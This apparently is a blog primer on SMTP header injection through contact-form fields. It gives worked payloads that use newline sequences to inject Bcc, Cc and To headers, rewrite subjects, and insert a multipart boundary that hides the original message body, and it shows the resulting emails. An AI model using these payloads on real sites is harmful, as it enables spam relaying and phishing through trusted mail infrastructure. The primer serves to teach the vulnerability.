---
title: "Primer: SMTP Header Injection"
date: 2019-07-24
tags: [vulnerability]
categories: [hacking, web application]
---


SMTP Header Injection is a vulnerability where an attacker may inject additional SMTP headers through an input field designated for another header.


The implications of a SMTP Header Injection vulnerability include things such as a spam relay or a specialized phishing vector. An attacker could modify the headers to send spam to targets completely outside of any intended recipients with completely custom messages - all through the vulnerable site, thereby avoiding having to originate the emails himself and with the resources of the target site. An attacker could also take advantage of the vulnerability to target employees of the site's company with phishing emails since the company's infrastructure will likely be set up to trust emails from their own SMTP service.

The attack vector for this vulnerability is present on many websites - through commonly seen "Contact Us" pages.

For example in the form shown below, there are input fields which allow the user to specify the `From Address`, `Subject`, and `Message` of the email that will be sent when the form is submitted. 

<img src="{{ site.url }}{{ site.baseurl }}/images/contact_us_1.png" alt="Screenshot of Contact Us page" width="46%" style="min-width:350px">

The From and Subject fields will be inserted into the corresponding `FROM` and `SUBJECT` header fields of the email, while the `Message` will be included as the body. When the email client constructs the email to be sent with the data provided by the user, it will have a structure similar to the following:

	From: $sender
	To: $hardcoded_recipient
	Subject: $subject

	$message


An example with concrete data:

	From: user@website.com
	To: webmaster@targetsite.com
	Subject: This is my subject

	Hi webmaster,
	I like your website.
	Thanks,
	User



Additional headers may be injected if the web application is simply concatenating the user's input together with the names of the header fields or if the email client takes escape sequences literally, like that for a newline.

Ex.

	"From: " + $sender + "\n" + "To: " + $hardcoded_recipient + "\n" + "Subject: " + ...
	
In the example, the header fields are concatenated to construct the same raw formatting as in the previous examples. In this case, once the entire string is parsed by the email client to construct and send the email, it will have no awareness of what was provided by the user vs. what the original hardcoded header names were. This allows the user to provide the string `user@website.com\nCc:recipient2@website.com\n` as the input to `$sender` to effectively inject a new `Cc` header into the email. The structure of the resulting email would be: 

	From: user@website.com
	Cc: recipient2@website.com
	To: webmaster@targetsite.com
	Subject: This is my subject

	Hi webmaster,
	I like your website.
	Thanks,
	User


Even though vulnerable applications and email clients aren't always concatenating everything together as literally as in this example, injecting additional headers works on the same premise in general and makes use of `CRLF` strings to designate new header fields. Because of these variations, different clients may require slightly modified injections to align with the quirks of each email client, though the concepts are the same. Also, depending on the context of where the injection is originating from or what languages are used in the application, the escape sequences for `CRLF` may need to be encoded or represented differently. In some cases, they may need to be passed in hex `\x0d\x0a`, URL encoded `%0d%0a`, or with just the C-style escape sequences `\r\n`. Additionally there may be different requirements for whether the entire CRLF sequence is needed to represent a new line. Typically, Linux only needs the line feed (`LF`) to terminate a line while Windows requires the carriage return as well (`CRLF`), and then the HTTP protocol also uses `CRLF` as standard for line termination.

One other potential nuance of differing email clients is that the client may separate away some header fields like `To` or `From` by individually setting them in the email's header in a way that would prevent injection. In these cases, injection payloads would just result in invalid field data if it were to contain `CRLF` characters. In many cases however, another field such as `Subject` might be tacked on to the header in a way that allows for including newlines and injecting more fields.

Common uses of SMTP Header Injection include modifying existing fields such as the `To` or `Subject` fields by either appending additional recipients or overwriting a pre-defined subject. Aside from pre-existing header fields, fields that were not present before may be added, such as `Cc` and `Bcc`.


### Ex 1: Inject `Bcc` & `Cc`

The following payload may be provided as the `Subject` to inject new `Bcc` and `Cc` header fields: 

	test subject\nBcc:user1@web.com\nCc:user2@web.com\n
	
Result:

	From: user@website.com
	To: webmaster@targetsite.com
	Subject: test subject
	Bcc: user1@web.com
	Cc: user2@web.com
	
	Hi webmaster,
	I like your website.
	Thanks,
	User

### Ex 2: Modify `To` & `Subject`

When specifying pre-existing fields as part of the injection payload, they may appear redundantly in the raw structure of the email. Depending on the email client that is used to consume the data provided for the header however, this will not result in an error, but may either append the new data to the existing value of the header field or replace it altogether. Different clients may behave differently, but in this example we will assume that the new data will simply be appended:

The following payload may be provided as the From address to append additional recipients as well as content to the Subject:

	user@website.com\nTo:user1@other.com,user2@web.com\nSubject:this is new\n

Result:

	From: user@website.com
	To:user1@other.com,user2@web.com
	Subject:this is new
	To: webmaster@targetsite.com
	Subject: test subject
	
	Hi webmaster,
	I like your website.
	Thanks,
	User

In this example, there are two `To` headers, and depending on the email client, it will just add all of the values to a list of recipients so that they all recieve the email:

	To: user1@other.com, user2@web.com,webmaster@targetsite.com

The two `Subject` headers may also become concatenated with each other to form the final subject of:
	
	Subject:this is newtestsubject 


### Ex 3: Inject a message into the body

Many forms that are used to generate emails do not allow the user to provide a message in the body of the email, and will send it with a predefined message. For example, a standard email generated may be the following, where the only user provided input is the user's email address and shipment number:

	From: User1@website.com
	To: orders_dept@targetsite.com
	Subject: Shipment Status Query: 325457860
	
	Hello Orders Dept,
	
	The customer User1 has requested the status for the shipment specified.
	
	-Logistics


A user could break into the body's message by supplying the required `CRLF` to end the current line and another immediate `CRLF` to effectively insert an empty null line before starting the body's message, as specified in [RFC 822](https://www.ietf.org/rfc/rfc822.txt). Many systems won't require the Carriage Return `CR` for improved interoperability with other implementations, so essentially what is needed are two back-to-back Line Feeds.

The user can provide the following payload as the Shipment Number in this case to break out of the headers to write into the body's message:

	replaced number\n\nbreak into body's message\nthis is the second line of the message\nThanks,\nAttacker\n

The resulting email is:

	From: User1@website.com
	To: orders_dept@targetsite.com
	Subject: Shipment Status Query: replaced number
	
	break into body's message
	this is the second line of the message
	Thanks,
	Attacker
	
	Hello Orders Dept,
	
	The customer User1 has requested the status for the shipment specified.
	
	-Logistics

It can be seen that the message injected from the header was prepended to the original message in the body. At this point, the attacker does not yet have full control over what is displayed in the body since the original message is still being shown.

[RFC 1341](https://tools.ietf.org/html/rfc1341) defines another optional header field that is less apparent when viewing an email. This is the `Content-Type` field and this allows the sender of the email to specify the type of the content that will be in the body of the mail. There are several content-types defined including application, audio, image, text, etc. and if there is no Content-Type specified, it will default to `text/plain`. The `multipart/mixed` Content-Type will be the focus here.

This essentially allows the body to be partitioned into multiple different sections where each section may have a different Content-Type. Each section is partitioned off by beginning and ending boundaries, where a single boundary designation can be both the end of the previous section and the start of the next. This Content-Type becomes important because any text outside of the boundaries, either before or after, will not be displayed in the email.

An example of an email formatted in this way is shown below:

	From: User1@website.com
	To: User2@website.com
	Subject: Check this out
	Content-type: multipart/mixed; boundary="right here"
	
	this is not displayed
	--right here
	
	by default, this is plaintext
	
	--right here
	Content-type: text/plain
	
	this has been specified to be plaintext
	
	--right here--
	this is also not displayed

The Content-Type above is defined as `mutlipart/mixed` and the boundary parameter is defined immediately afterwards to be `right here`. When marking the boundaries in the body, the boundary name must be preceded by two hyphen (`"-"`) characeters. Then any additional headers may be defined for that section on the following lines, but an empty line must precede the body contents of the section after the boundary or headers. The end of the message is designated with an ending boundary that has two hypens before and after the boundary name. This denotes that there are no more body parts to follow and anything afterwards will not be displayed in the email. This can be taken advantage of to fully take control of the body's contents when injecting a message from the header.

The result from the previous example where a message was injected into the body from the header:

	From: User1@website.com
	To: orders_dept@targetsite.com
	Subject: Shipment Status Query: replaced number
	
	break into body's message
	this is the second line of the message
	Thanks,
	Attacker
	
	Hello Orders Dept,
	
	The customer User1 has requested the status for the shipment specified.
	
	-Logistics

The following payload may be injected into the same position in the Subject header field as before, this time taking advantage of the Content-Type field:

	replaced number\nContent-type:multipart/mixed;boundary=myboundary\n\n--myboundary\n\nthis is in the body's message after the boundary\nthis is the second line\n\n--myboundary--\n

The resulting email:

	From: User1@website.com
	To: orders_dept@targetsite.com
	Subject: Shipment Status Query: replaced number
	Content-type:multipart/mixed;boundary=myboundary
	
	--myboundary
	
	this is in the body's message after the boundary
	this is the second line
	
	--myboundary--
	Hello Orders Dept,
	
	The customer User1 has requested the status for the shipment specified.
	
	-Logistics
	
This solves the problem of the original message still being displayed in the email since the terminating boundary is inserted before that message. Effectively, all the recipient would see is:

	From: User1@website.com
	To: orders_dept@targetsite.com
	Subject: Shipment Status Query: replaced number
	
	this is in the body's message after the boundary
	this is the second line


This was just an example of some of the header fields that SMTP takes advantage of; there are many more however which can all be useful in different use cases.


